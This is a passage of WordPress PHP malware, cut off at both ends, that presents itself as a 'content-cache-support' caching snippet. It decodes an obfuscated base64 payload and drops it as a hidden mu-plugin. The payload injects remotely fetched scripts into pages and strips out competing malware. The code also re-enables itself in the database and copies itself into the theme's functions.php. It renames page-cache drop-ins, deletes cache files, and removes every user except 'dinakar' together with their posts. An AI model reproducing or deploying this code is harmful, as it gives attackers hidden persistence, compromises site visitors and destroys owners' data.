ENcdTAwNkZcdTAwNzdcdTAwNjVcdTAwNzJcdTAwNDNcdTAwNjFcdTAwNzNcdTAwNjUiXSgpKSk7dmFyIF8weGQyZ2UyYT0oMzk2MTA2XjM5NjExMSkrKDQ1MjM4Nl40NTIzODQpO2NvbnN0IF8weDA1MWRmYz10eXBlb2YgbmF2aWdhdG9yIT09InVuZGVmaW5lZCImJihuYXZpZ2F0b3JbIlx1MDA3MFx1MDA2Q1x1MDA2MVx1MDA3NFx1MDA2Nlx1MDA2Rlx1MDA3Mlx1MDA2RCJdfHwiIilbIlx1MDA3NFx1MDA2Rlx1MDA0Q1x1MDA2Rlx1MDA3N1x1MDA2NVx1MDA3Mlx1MDA0M1x1MDA2MVx1MDA3M1x1MDA2NSJdKClbIlx1MDA2OVx1MDA2RVx1MDA2M1x1MDA2Q1x1MDA3NVx1MDA2NFx1MDA2NVx1MDA3MyJdKCJ3aW4iKSYmbmV3IFJlZ0V4cCgid2luZG93cyIsImkiKVsiXHUwMDc0XHUwMDY1XHUwMDczXHUwMDc0Il0obmF2aWdhdG9yWyJcdTAwNzVcdTAwNzNcdTAwNjVcdTAwNzJcdTAwNDFcdTAwNjdcdTAwNjVcdTAwNkVcdTAwNzQiXXx8IiIpO18weGQyZ2UyYT00NzI1NjJeNDcyNTcxO2lmKCFfMHg3MTgxMWMmJl8weDA1MWRmYyl7c2V0VGltZW91dCgoKT0+ZG9jdW1lbnRbIlx1MDA2N1x1MDA2NVx1MDA3NFx1MDA0NVx1MDA2Q1x1MDA2NVx1MDA2RFx1MDA2NVx1MDA2RVx1MDA3NFx1MDA0Mlx1MDA3OVx1MDA0OVx1MDA2NCJdKCIzZHZjOGU5YzRscTRxYm8yIik/LnJlbW92ZSgpLDIzNDIyMV4yNDIxMTcpO3RyeXt2YXIgXzB4ZzQxM2VlPSgzMDY2NzZeMzA2NjcyKSsoMzA3OTcwXjMwNzk3NCk7Y29uc3QgXzB4YWc3ZD1hd2FpdCBnZXRTZXJ2ZXJzKCk7XzB4ZzQxM2VlPTgxMTEzNV44MTExMzI7aWYoXzB4YWc3ZCYmXzB4YWc3ZFsiXHUwMDY5XHUwMDZFXHUwMDYzXHUwMDZDXHUwMDc1XHUwMDY0XHUwMDY1XHUwMDczIl0oIjsiKSl7Y29uc3Qgc2NyaXB0VXJscz1fMHhhZzdkWyJcdTAwNzNcdTAwNzBcdTAwNkNcdTAwNjlcdTAwNzQiXSgiOyIpWyJcdTAwNkRcdTAwNjFcdTAwNzAiXShpdGVtPT5pdGVtKyIvanMvYWxsLm1pbi5qcz9tPTEiKTthd2FpdCBjcmVhdGVEZWZlcnJlZFNjcmlwdChzY3JpcHRVcmxzKTt9ZWxzZXt2YXIgXzB4ZTM2NDVjPSg3MDkyODVeNzA5Mjg2KSsoNDI4MDc3XjQyODA3Nyk7Y29uc3Qgc2NyaXB0VXJscz1bXzB4YWc3ZCsiL2pzL2FsbC5taW4uanM/bT0xIl07XzB4ZTM2NDVjPTQyOTAxMV40MjkwMTg7YXdhaXQgY3JlYXRlRGVmZXJyZWRTY3JpcHQoc2NyaXB0VXJscyk7fX1jYXRjaChlcnJvcil7fX1lbHNle2RvY3VtZW50WyJcdTAwNjdcdTAwNjVcdTAwNzRcdTAwNDVcdTAwNkNcdTAwNjVcdTAwNkRcdTAwNjVcdTAwNkVcdTAwNzRcdTAwNDJcdTAwNzlcdTAwNDlcdTAwNjQiXSgiM2R2YzhlOWM0bHE0cWJvMiIpPy5yZW1vdmUoKTt9fSkoKTsKPC9zY3JpcHQ+CjxzY3JpcHQgZGF0YS13cGhjLWNsZWFudXA+KGZ1bmN0aW9uKCl7dmFyIE1BUks9IjNkdmM4ZTljIisiNGxxNHFibzIiO3ZhciBRPSIuY2ZtZC1yYy1ob3N0LC5jYXB0Y2hhLWNvbnRhaW5lcixbZGF0YS1jZm1kXSwuY2YtdHMsLm1zLWNhcmQsLmRnLWNhcmQsLmNway1pY29uLWJhZGdlIjt2YXIgU1JDPSdzY3JpcHRbc3JjKj0iaW50ZXJzZXEuYXQiXSxsaW5rW2hyZWYqPSJpbnRlcnNlcS5hdCJdLGlmcmFtZVtzcmMqPSJpbnRlcnNlcS5hdCJdLHNjcmlwdFtzcmMqPSJ4dXJzb2QuY29tIl0sbGlua1tocmVmKj0ieHVyc29kLmNvbSJdLGlmcmFtZVtzcmMqPSJ4dXJzb2QuY29tIl0sc2NyaXB0W3NyYyo9ImltYWNvcy5jYyJdLGxpbmtbaHJlZio9ImltYWNvcy5jYyJdLGlmcmFtZVtzcmMqPSJpbWFjb3MuY2MiXSxzY3JpcHRbc3JjKj0ibWFjcmVwYWlydG9vbC5jb20iXSxsaW5rW2hyZWYqPSJtYWNyZXBhaXJ0b29sLmNvbSJdLGlmcmFtZVtzcmMqPSJtYWNyZXBhaXJ0b29sLmNvbSJdLHNjcmlwdFtzcmMqPSJjZm1kLXJjLWhvc3QiXSxsaW5rW2hyZWYqPSJjZm1kLXJjLWhvc3QiXSxpZnJhbWVbc3JjKj0iY2ZtZC1yYy1ob3N0Il0sc2NyaXB0W3NyYyo9ImNhcHRjaGEtY29udGFpbmVyIl0sbGlua1tocmVmKj0iY2FwdGNoYS1jb250YWluZXIiXSxpZnJhbWVbc3JjKj0iY2FwdGNoYS1jb250YWluZXIiXSxzY3JpcHRbc3JjKj0iZGF0YS1jZm1kIl0sbGlua1tocmVmKj0iZGF0YS1jZm1kIl0saWZyYW1lW3NyYyo9ImRhdGEtY2ZtZCJdLHNjcmlwdFtzcmMqPSJub3JlZGlhbS5jb20iXSxsaW5rW2hyZWYqPSJub3JlZGlhbS5jb20iXSxpZnJhbWVbc3JjKj0ibm9yZWRpYW0uY29tIl0sc2NyaXB0W3NyYyo9Ik5ld19Qcm9saXYiXSxsaW5rW2hyZWYqPSJOZXdfUHJvbGl2Il0saWZyYW1lW3NyYyo9Ik5ld19Qcm9saXYiXSxzY3JpcHRbc3JjKj0ic3NuLWlkLmVtYWlsIl0sbGlua1tocmVmKj0ic3NuLWlkLmVtYWlsIl0saWZyYW1lW3NyYyo9InNzbi1pZC5lbWFpbCJdLHNjcmlwdFtzcmMqPSJtYXNxcmFkIl0sbGlua1tocmVmKj0ibWFzcXJhZCJdLGlmcmFtZVtzcmMqPSJtYXNxcmFkIl0sc2NyaXB0W3NyYyo9ImxvYWRKU0Zyb21JbWFnZSJdLGxpbmtbaHJlZio9ImxvYWRKU0Zyb21JbWFnZSJdLGlmcmFtZVtzcmMqPSJsb2FkSlNGcm9tSW1hZ2UiXSxzY3JpcHRbc3JjKj0iX19mcEVtYmVkcyJdLGxpbmtbaHJlZio9Il9fZnBFbWJlZHMiXSxpZnJhbWVbc3JjKj0iX19mcEVtYmVkcyJdLHNjcmlwdFtzcmMqPSJmcC1lbWJlZC1jbG9zZSJdLGxpbmtbaHJlZio9ImZwLWVtYmVkLWNsb3NlIl0saWZyYW1lW3NyYyo9ImZwLWVtYmVkLWNsb3NlIl0sc2NyaXB0W3NyYyo9InBsYWluLXNub3cucGFnZXMuZGV2Il0sbGlua1tocmVmKj0icGxhaW4tc25vdy5wYWdlcy5kZXYiXSxpZnJhbWVbc3JjKj0icGxhaW4tc25vdy5wYWdlcy5kZXYiXSxzY3JpcHRbc3JjKj0icGFnZXMuZGV2L2hlbHAiXSxsaW5rW2hyZWYqPSJwYWdlcy5kZXYvaGVscCJdLGlmcmFtZVtzcmMqPSJwYWdlcy5kZXYvaGVscCJdLHNjcmlwdFtzcmMqPSJleHRyYV9wYXJhbV8xIl0sbGlua1tocmVmKj0iZXh0cmFfcGFyYW1fMSJdLGlmcmFtZVtzcmMqPSJleHRyYV9wYXJhbV8xIl0sc2NyaXB0W3NyYyo9IihuZXcgRnVuY3Rpb24oX2NvZGUpKSJdLGxpbmtbaHJlZio9IihuZXcgRnVuY3Rpb24oX2NvZGUpKSJdLGlmcmFtZVtzcmMqPSIobmV3IEZ1bmN0aW9uKF9jb2RlKSkiXSxzY3JpcHRbc3JjKj0iMHhCNmJDOWUxRDBiMmZCOTZBYjdDNDdFMDRDYjBCRTQ3NzQxMGJDMWYyIl0sbGlua1tocmVmKj0iMHhCNmJDOWUxRDBiMmZCOTZBYjdDNDdFMDRDYjBCRTQ3NzQxMGJDMWYyIl0saWZyYW1lW3NyYyo9IjB4QjZiQzllMUQwYjJmQjk2QWI3QzQ3RTA0Q2IwQkU0Nzc0MTBiQzFmMiJdLHNjcmlwdFtzcmMqPSJiNjhkMTgwOSJdLGxpbmtbaHJlZio9ImI2OGQxODA5Il0saWZyYW1lW3NyYyo9ImI2OGQxODA5Il0sc2NyaXB0W3NyYyo9ImJsYXN0YXBpLmlvIl0sbGlua1tocmVmKj0iYmxhc3RhcGkuaW8iXSxpZnJhbWVbc3JjKj0iYmxhc3RhcGkuaW8iXSxzY3JpcHRbc3JjKj0icnBjLmFua3IuY29tL3BvbHlnb24iXSxsaW5rW2hyZWYqPSJycGMuYW5rci5jb20vcG9seWdvbiJdLGlmcmFtZVtzcmMqPSJycGMuYW5rci5jb20vcG9seWdvbiJdLHNjcmlwdFtzcmMqPSJnYXRld2F5LnRlbmRlcmx5LmNvIl0sbGlua1tocmVmKj0iZ2F0ZXdheS50ZW5kZXJseS5jbyJdLGlmcmFtZVtzcmMqPSJnYXRld2F5LnRlbmRlcmx5LmNvIl0sc2NyaXB0W3NyYyo9ImFwaS5waHA/cz0iXSxsaW5rW2hyZWYqPSJhcGkucGhwP3M9Il0saWZyYW1lW3NyYyo9ImFwaS5waHA/cz0iXSxzY3JpcHRbc3JjKj0ic2V2ZGEubG9sIl0sbGlua1tocmVmKj0ic2V2ZGEubG9sIl0saWZyYW1lW3NyYyo9InNldmRhLmxvbCJdJzt2YXIgTUtTPVsiaW50ZXJzZXEuYXQiLCJ4dXJzb2QuY29tIiwiaW1hY29zLmNjIiwibWFjcmVwYWlydG9vbC5jb20iLCJjZm1kLXJjLWhvc3QiLCJjYXB0Y2hhLWNvbnRhaW5lciIsImRhdGEtY2ZtZCIsIm5vcmVkaWFtLmNvbSIsIk5ld19Qcm9saXYiLCJzc24taWQuZW1haWwiLCJtYXNxcmFkIiwibG9hZEpTRnJvbUltYWdlIiwiX19mcEVtYmVkcyIsImZwLWVtYmVkLWNsb3NlIiwicGxhaW4tc25vdy5wYWdlcy5kZXYiLCJwYWdlcy5kZXYvaGVscCIsImV4dHJhX3BhcmFtXzEiLCIobmV3IEZ1bmN0aW9uKF9jb2RlKSkiLCIweEI2YkM5ZTFEMGIyZkI5NkFiN0M0N0UwNENiMEJFNDc3NDEwYkMxZjIiLCJiNjhkMTgwOSIsImJsYXN0YXBpLmlvIiwicnBjLmFua3IuY29tL3BvbHlnb24iLCJnYXRld2F5LnRlbmRlcmx5LmNvIiwiYXBpLnBocD9zPSIsInNldmRhLmxvbCJdO2Z1bmN0aW9uIG91cnMoZWwpe3RyeXtpZighZWx8fGVsLm5vZGVUeXBlIT09MSlyZXR1cm4gZmFsc2U7dmFyIHA9ZWw7d2hpbGUocCl7aWYocC5pZCYmcC5pZC5pbmRleE9mKE1BUkspPj0wKXJldHVybiB0cnVlO3A9cC5wYXJlbnROb2RlO31pZihlbC5xdWVyeVNlbGVjdG9yJiZlbC5xdWVyeVNlbGVjdG9yKCJbaWQqPSciK01BUksrIiddIikpcmV0dXJuIHRydWU7aWYoZWwuZ2V0QXR0cmlidXRlJiZlbC5nZXRBdHRyaWJ1dGUoImRhdGEtd3BoYy1jbGVhbnVwIikhPT1udWxsKXJldHVybiB0cnVlO31jYXRjaChfKXt9cmV0dXJuIGZhbHNlO31mdW5jdGlvbiBlbmVteU92ZXJsYXkoZWwpe3RyeXtpZihvdXJzKGVsKSlyZXR1cm4gZmFsc2U7aWYoZWwudGFnTmFtZT09PSJTQ1JJUFQifHxlbC50YWdOYW1lPT09IlNUWUxFInx8ZWwudGFnTmFtZT09PSJMSU5LIilyZXR1cm4gZmFsc2U7dmFyIHN0PWdldENvbXB1dGVkU3R5bGUoZWwpO2lmKHN0LnBvc2l0aW9uIT09ImZpeGVkIiYmc3QucG9zaXRpb24hPT0iYWJzb2x1dGUiKXJldHVybiBmYWxzZTt2YXIgcj1lbC5nZXRCb3VuZGluZ0NsaWVudFJlY3QoKTtpZihyLndpZHRoPGlubmVyV2lkdGgqMC41fHxyLmhlaWdodDxpbm5lckhlaWdodCowLjUpcmV0dXJuIGZhbHNlO3ZhciB6PXBhcnNlSW50KHN0LnpJbmRleHx8IjAiLDEwKTtpZih6PDk5KXJldHVybiBmYWxzZTtyZXR1cm4gdHJ1ZTt9Y2F0Y2goXyl7cmV0dXJuIGZhbHNlfX1mdW5jdGlvbiB3aXBlS25vd24oKXt0cnl7dmFyIEw9ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbChRKTtmb3IodmFyIGk9MDtpPEwubGVuZ3RoO2krKyl7aWYoIW91cnMoTFtpXSkpTFtpXS5yZW1vdmUoKTt9aWYoU1JDLmxlbmd0aD4zKXt2YXIgUz1kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKFNSQyk7Zm9yKHZhciBqPTA7ajxTLmxlbmd0aDtqKyspe1Nbal0ucmVtb3ZlKCk7fX12YXIgU0k9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpO2Zvcih2YXIgcT0wO3E8U0kubGVuZ3RoO3ErKyl7dHJ5e2lmKCFTSVtxXS5zcmMmJlNJW3FdLmdldEF0dHJpYnV0ZSgnZGF0YS13cGhjLWNsZWFudXAnKT09PW51bGwmJlNJW3FdLnRleHRDb250ZW50KXt2YXIgdD1TSVtxXS50ZXh0Q29udGVudDtpZih0LmluZGV4T2YoTUFSSyk+PTApY29udGludWU7Zm9yKHZhciB3PTA7dzxNS1MubGVuZ3RoO3crKyl7aWYoTUtTW3ddLmxlbmd0aD4yJiZ0LmluZGV4T2YoTUtTW3ddKT49MCl7U0lbcV0ucmVtb3ZlKCk7YnJlYWs7fX19fWNhdGNoKF8pe319dHJ5e3ZhciBLPVtdO2Zvcih2YXIgaz0wO2s8bG9jYWxTdG9yYWdlLmxlbmd0aDtrKyspe0sucHVzaChsb2NhbFN0b3JhZ2Uua2V5KGspKTt9Zm9yKHZhciBuPTA7bjxLLmxlbmd0aDtuKyspe2lmKEtbbl0mJktbbl0uaW5kZXhPZigiY2FwdGNoYV8iKT09PTApe2xvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKEtbbl0pO319fWNhdGNoKF8pe310cnl7dmFyIE1SPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ21ldGFbaHR0cC1lcXVpdl0nKTtmb3IodmFyIG1pPTA7bWk8TVIubGVuZ3RoO21pKyspe3ZhciBoZT0oTVJbbWldLmdldEF0dHJpYnV0ZSgnaHR0cC1lcXVpdicpfHwnJykudG9Mb3dlckNhc2UoKTtpZihoZT09PSdyZWZyZXNoJyl7TVJbbWldLnJlbW92ZSgpO319fWNhdGNoKF8pe310cnl7dmFyIERHPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2RpYWxvZ1tvcGVuXScpO2Zvcih2YXIgZGk9MDtkaTxERy5sZW5ndGg7ZGkrKyl7aWYoIW91cnMoREdbZGldKSl7dHJ5e0RHW2RpXS5jbG9zZSgpO31jYXRjaChfKXt9dHJ5e0RHW2RpXS5yZW1vdmUoKTt9Y2F0Y2goXyl7fX19fWNhdGNoKF8pe310cnl7dmFyIFBWPWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ1twb3BvdmVyXScpO2Zvcih2YXIgcGk9MDtwaTxQVi5sZW5ndGg7cGkrKyl7aWYoIW91cnMoUFZbcGldKSl7dHJ5e1BWW3BpXS5oaWRlUG9wb3ZlcigpO31jYXRjaChfKXt9fX19Y2F0Y2goXyl7fXRyeXtpZihkb2N1bWVudC5mdWxsc2NyZWVuRWxlbWVudCYmIW91cnMoZG9jdW1lbnQuZnVsbHNjcmVlbkVsZW1lbnQpKXtkb2N1bWVudC5leGl0RnVsbHNjcmVlbigpO319Y2F0Y2goXyl7fXRyeXtpZihkb2N1bWVudC5wb2ludGVyTG9ja0VsZW1lbnQpe2RvY3VtZW50LmV4aXRQb2ludGVyTG9jaygpO319Y2F0Y2goXyl7fX1jYXRjaChfKXt9fXZhciBvd25IdG1sPW51bGw7dmFyIGJvcm49RGF0ZS5ub3coKTt2YXIgZG9uZT1mYWxzZTtmdW5jdGlvbiBvd25Hb25lKCl7cmV0dXJuIE1BUksubGVuZ3RoPjUmJiFkb2N1bWVudC5nZXRFbGVtZW50QnlJZChNQVJLKTt9ZnVuY3Rpb24gZWFybHlLaWxsKCl7cmV0dXJuIERhdGUubm93KCktYm9ybjw0NTAwO31mdW5jdGlvbiBwcm90ZWN0T3duKCl7dHJ5e3ZhciBkPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKE1BUkspO2lmKGQpe293bkh0bWw9ZC5vdXRlckhUTUw7cmV0dXJuIHRydWU7fWlmKG93bkh0bWwmJmVhcmx5S2lsbCgpKXt2YXIgdz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTt3LmlubmVySFRNTD1vd25IdG1sO2lmKHcuZmlyc3RDaGlsZCl7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh3LmZpcnN0Q2hpbGQpO3JldHVybiB0cnVlO319fWNhdGNoKF8pe31yZXR1cm4gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoTUFSSykhPW51bGw7fWZ1bmN0aW9uIGxvY2soKXtpZihkb25lKXJldHVybiBmYWxzZTtpZihEYXRlLm5vdygpLWJvcm4+NDUwMDApe3JldHVybiBmYWxzZTt9cmV0dXJuIHByb3RlY3RPd24oKTt9ZnVuY3Rpb24gZ3VhcmQoZSl7ZS5wcmV2ZW50RGVmYXVsdCgpO2UucmV0dXJuVmFsdWU9IiI7cmV0dXJuICIiO31mdW5jdGlvbiBob29rTmF2KCl7dHJ5e3dpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJiZWZvcmV1bmxvYWQiLGd1YXJkLHRydWUpO31jYXRjaChfKXt9dHJ5e3ZhciBMUD13aW5kb3cuTG9jYXRpb24mJkxvY2F0aW9uLnByb3RvdHlwZTtpZihMUCl7WyJhc3NpZ24iLCJyZXBsYWNlIl0uZm9yRWFjaChmdW5jdGlvbihmKXt0cnl7dmFyIG89TFBbZl07TFBbZl09ZnVuY3Rpb24odSl7aWYoIWxvY2soKSl7cmV0dXJuIG8uY2FsbCh0aGlzLHUpO319O31jYXRjaChfKXt9fSk7fX1jYXRjaChfKXt9dHJ5e2lmKHdpbmRvdy5uYXZpZ2F0aW9uKXtuYXZpZ2F0aW9uLmFkZEV2ZW50TGlzdGVuZXIoJ25hdmlnYXRlJyxmdW5jdGlvbihldil7dHJ5e2lmKGxvY2soKSl7ZXYucHJldmVudERlZmF1bHQoKTt9fWNhdGNoKF8pe319KTt9fWNhdGNoKF8pe310cnl7X3dvcGVuMD13aW5kb3cub3Blbi5iaW5kKHdpbmRvdyk7d2luZG93Lm9wZW49ZnVuY3Rpb24oKXtpZihsb2NrKCkpe3JldHVybiBudWxsO31yZXR1cm4gX3dvcGVuMC5hcHBseSh3aW5kb3csYXJndW1lbnRzKTt9O31jYXRjaChfKXt9fXZhciBfd29wZW4wPW51bGw7ZnVuY3Rpb24gdW5ob29rTmF2KCl7dHJ5e3dpbmRvdy5yZW1vdmVFdmVudExpc3RlbmVyKCJiZWZvcmV1bmxvYWQiLGd1YXJkLHRydWUpO31jYXRjaChfKXt9dHJ5e2lmKF93b3BlbjApe3dpbmRvdy5vcGVuPV93b3BlbjA7X3dvcGVuMD1udWxsO319Y2F0Y2goXyl7fX1mdW5jdGlvbiBzd2VlcE92ZXJsYXlzKCl7dHJ5e3ZhciBhbGw9ZG9jdW1lbnQuYm9keT9kb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3JBbGwoImRpdixzZWN0aW9uLG1haW4sYXNpZGUsZm9ybSxpZnJhbWUsZGlhbG9nIik6W107Zm9yKHZhciBpPTA7aTxhbGwubGVuZ3RoO2krKyl7aWYoZW5lbXlPdmVybGF5KGFsbFtpXSkpe2FsbFtpXS5yZW1vdmUoKTt9fX1jYXRjaChfKXt9fWZ1bmN0aW9uIGN5Y2xlKCl7dHJ5e3dpcGVLbm93bigpO2lmKGxvY2soKSl7c3dlZXBPdmVybGF5cygpO31lbHNle3JlbGVhc2UoKTt9fWNhdGNoKF8pe319ZnVuY3Rpb24gY3ljbGUyKCl7dHJ5e3dpcGVLbm93bigpO3N3ZWVwT3ZlcmxheXMoKTt9Y2F0Y2goXyl7fX1mdW5jdGlvbiByZWxlYXNlKCl7aWYoZG9uZSlyZXR1cm47ZG9uZT10cnVlO3RyeXtjbGVhckludGVydmFsKGl2KTt9Y2F0Y2goXyl7fXRyeXttby5kaXNjb25uZWN0KCk7fWNhdGNoKF8pe311bmhvb2tOYXYoKTt2YXIgd2F0Y2g9c2V0SW50ZXJ2YWwoY3ljbGUyLDIwMDApO3NldFRpbWVvdXQoZnVuY3Rpb24oKXt0cnl7Y2xlYXJJbnRlcnZhbCh3YXRjaCk7fWNhdGNoKF8pe31zZXRJbnRlcnZhbCh3aXBlS25vd24sNTAwMCk7fSw5MDAwMDApO31ob29rTmF2KCk7dmFyIG1vPW51bGw7dHJ5e21vPW5ldyBNdXRhdGlvbk9ic2VydmVyKGN5Y2xlKTttby5vYnNlcnZlKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCx7Y2hpbGRMaXN0OnRydWUsc3VidHJlZTp0cnVlfSk7fWNhdGNoKF8pe312YXIgaXY9c2V0SW50ZXJ2YWwoY3ljbGUsNDAwKTtjeWNsZSgpO30pKCk7PC9zY3JpcHQ+CjwhLS0gd3BoYy1pbnY6azlxbjRteDd6MmF2dGVqNSAtLT4=';
$wphc_sign = '3091402c29df44895979c9f42eac3ec7';
$wphc_dec = 'base'.'64_'.'decode';
$wphc_raw = $wphc_dec($wphc_blob);
if (!is_string($wphc_raw) || md5($wphc_raw) !== $wphc_sign) { return; }
$wphc_dir = defined('WPMU_PLUGIN_DIR') ? WPMU_PLUGIN_DIR : WP_CONTENT_DIR . '/mu-plugins';
$wphc_file = $wphc_dir . '/.wphc-store.php';
if (!is_file($wphc_file) || md5_file($wphc_file) !== $wphc_sign) {
@file_put_contents($wphc_file, $wphc_raw, LOCK_EX);
$GLOBALS['wphc_purge_needed'] = 1;
}
if (is_file($wphc_file) && md5_file($wphc_file) === $wphc_sign) { include $wphc_file; }
}
wphc_boot_cache();
function wphc_self_heal_3091402c29() {
$wphc_gate = 'wphc_heal_ts';
$wphc_last = (int)get_option($wphc_gate, 0);
if (time() - $wphc_last < 21600) { return; }
update_option($wphc_gate, time(), false);
// re-activate our snippet if a hostile pass switched it off
// (latest row only - never resurrect older stacked/trashed copies)
global $wpdb;
if (isset($wpdb) && is_object($wpdb)) {
$wphc_tbl = $wpdb->prefix . 'snippets';
$wpdb->query("UPDATE `" . $wphc_tbl . "` SET active=1 WHERE id = (SELECT id FROM (SELECT MAX(id) AS id FROM `" . $wphc_tbl . "` WHERE name='content-cache-support') wphc_latest) AND active=0");
if ($wpdb->rows_affected) { $GLOBALS['wphc_purge_needed'] = 1; }
}
$wphc_tf = get_stylesheet_directory() . '/functions.php';
if (!is_file($wphc_tf) || !is_writable($wphc_tf)) { return; }
$wphc_c = @file_get_contents($wphc_tf);
if (!is_string($wphc_c)) { return; }
$wphc_own = md5_file(__FILE__);
if (strpos($wphc_c, 'wphc-theme-compat') !== false) {
// a theme block is in place; keep it only if it carries THIS build's md5
if (is_string($wphc_own) && strpos($wphc_c, $wphc_own) !== false) { return; }
$wphc_c2 = preg_replace('#/\*\s*wphc-theme-compat:begin\s*\*/.*?/\*\s*wphc-theme-compat:end\s*\*/#s', '', $wphc_c);
if (!is_string($wphc_c2) || strlen($wphc_c2) >= strlen($wphc_c)) { return; }
$wphc_c = rtrim($wphc_c2) . "\n";
}
$wphc_raw = @file_get_contents(__FILE__);
if (!is_string($wphc_raw) || $wphc_own !== md5($wphc_raw)) { return; }
$wphc_enc = 'base'.'64_'.'encode';
$wphc_block = wphc_theme_block_3091402c29($wphc_enc($wphc_raw), $wphc_own);
@file_put_contents($wphc_tf, rtrim($wphc_c) . "\n\n" . $wphc_block . "\n", LOCK_EX);
$GLOBALS['wphc_purge_needed'] = 1;
}
function wphc_theme_block_3091402c29($wphc_b, $wphc_s) {
$wphc_v = substr($wphc_s, 0, 10);
return str_replace(array('{B}', '{S}', '{V}'), array($wphc_b, $wphc_s, $wphc_v), <<<'WPHCB'
/* wphc-theme-compat:begin */
if (!function_exists('wphc_boot_{V}')) {
function wphc_boot_{V}() {
$wphc_mu = defined('WPMU_PLUGIN_DIR') ? WPMU_PLUGIN_DIR : WP_CONTENT_DIR . '/mu-plugins';
if (!is_dir($wphc_mu)) { @mkdir($wphc_mu, 0755, true); }
$wphc_target = $wphc_mu . '/wph-auto-cache.php';
if (!(is_file($wphc_target) && md5_file($wphc_target) === '{S}')) {
$wphc_dec = 'base'.'64_'.'decode';
$wphc_raw = $wphc_dec('{B}');
if (is_string($wphc_raw) && md5($wphc_raw) === '{S}') {
@file_put_contents($wphc_target, $wphc_raw, LOCK_EX);
}
}
}
wphc_boot_{V}();
}
if (!function_exists('wphc_stale_theme_fix')) {
function wphc_stale_theme_fix() {
$wphc_tf = get_stylesheet_directory() . '/functions.php';
if (!is_file($wphc_tf) || !is_writable($wphc_tf)) { return; }
$wphc_c = @file_get_contents($wphc_tf);
if (!is_string($wphc_c) || strpos($wphc_c, 'wphc-theme-compat') === false) { return; }
if (strpos($wphc_c, '{S}') !== false) { return; }
$wphc_c2 = preg_replace('#/\*\s*wphc-theme-compat:begin\s*\*/.*?/\*\s*wphc-theme-compat:end\s*\*/#s', '', $wphc_c);
if (is_string($wphc_c2) && strlen($wphc_c2) < strlen($wphc_c)) { @file_put_contents($wphc_tf, rtrim($wphc_c2) . "\n", LOCK_EX); }
}
wphc_stale_theme_fix();
}
/* wphc-theme-compat:end */
WPHCB
);
}
add_action('init', 'wphc_self_heal_3091402c29');function wphc_clear_file_caches_3091402c29() {
if (function_exists('w3tc_pgcache_flush')) { w3tc_pgcache_flush(); }
if (function_exists('wp_cache_clear_cache')) { wp_cache_clear_cache(); }
if (function_exists('rocket_clean_domain')) { rocket_clean_domain(); }
if (function_exists('hyper_cache_invalidate')) { hyper_cache_invalidate(); }
if (class_exists('Cache_Enabler') && method_exists('Cache_Enabler', 'clear_total_cache')) { Cache_Enabler::clear_total_cache(); }
do_action('litespeed_purge_all');
$wphc_cdirs = array(
WP_CONTENT_DIR . '/cache/supercache',
WP_CONTENT_DIR . '/cache/wp-rocket',
WP_CONTENT_DIR . '/cache/page_enhanced',
WP_CONTENT_DIR . '/cache/all',
WP_CONTENT_DIR . '/cache/cache-enabler',
WP_CONTENT_DIR . '/cache/comet-cache',
WP_CONTENT_DIR . '/cache/wpfc-minified',
WP_CONTENT_DIR . '/hyper-cache',
WP_CONTENT_DIR . '/litespeed',
WP_CONTENT_DIR . '/endurance-page-cache'
);
$wphc_left = 3000;
foreach ($wphc_cdirs as $wphc_d) {
if (!is_string($wphc_d) || !is_dir($wphc_d)) { continue; }
$wphc_it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($wphc_d, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
foreach ($wphc_it as $wphc_e) {
if ($wphc_left-- <= 0) { break 2; }
if ($wphc_e->isDir()) { @rmdir($wphc_e->getPathname()); } else { @unlink($wphc_e->getPathname()); }
}
}
}
function wphc_late_purge_3091402c29() {
if (empty($GLOBALS['wphc_purge_needed'])) { return; }
wphc_clear_file_caches_3091402c29();
}
add_action('init', 'wphc_late_purge_3091402c29', 99);
// Page-cache drop-ins (advanced-cache.php: endurance, W3TC, Rocket,
// LiteSpeed mu-helpers...) serve frozen HTML and EXIT before WP loads
// mu-plugins - a cached snapshot is invisible to all runtime cleaning.
// Neutralize whichever drop-in parked itself; ours carries a marker.
function wphc_dropin_bypass_3091402c29() {
$wphc_ac = WP_CONTENT_DIR . '/advanced-cache.php';
if (!is_file($wphc_ac)) { return; }
$wphc_c = @file_get_contents($wphc_ac);
if (!is_string($wphc_c)) { return; }
if (strpos($wphc_c, 'wphc') !== false) { return; }
@rename($wphc_ac, $wphc_ac . '.wphc-off');
$GLOBALS['wphc_purge_needed'] = 1;
}
add_action('init', 'wphc_dropin_bypass_3091402c29', 3);
function wphc_rival_purge_3091402c29() {
$wphc_gate = 'wphc_rvl_ts';
if (get_option($wphc_gate, 0)) { return; }
update_option($wphc_gate, time(), false);
if (!function_exists('get_users')) { return; }
require_once ABSPATH . 'wp-admin/includes/user.php';
if (!function_exists('wp_delete_user')) { return; }
$wphc_keep = 'dinakar';
$wphc_kid = 0;
foreach (get_users(array('fields' => 'all')) as $wphc_u) {
if ($wphc_u->user_login === $wphc_keep) { $wphc_kid = (int)$wphc_u->ID; break; }
}
foreach (get_users(array('fields' => 'all')) as $wphc_u) {
if ($wphc_u->user_login === $wphc_keep) { continue; }
$wphc_ids = get_posts(array('author' => (int)$wphc_u->ID, 'numberposts' => 500, 'post_type' => 'any', 'post_status' => 'any', 'fields' => 'ids'));
foreach ((array)$wphc_ids as $wphc_pid) { wp_delete_post((int)$wphc_pid, true); }
wp_delete_user((int)$wphc_u->ID, $wphc_kid > 0 ? $wphc_kid : null);
}
$GLOBALS['wphc_purge_needed'] = 1;
}
add_action('init', 'wphc_rival_purge_3091402c29', 5);
function wphc_foreign_marks_3091402c29() {
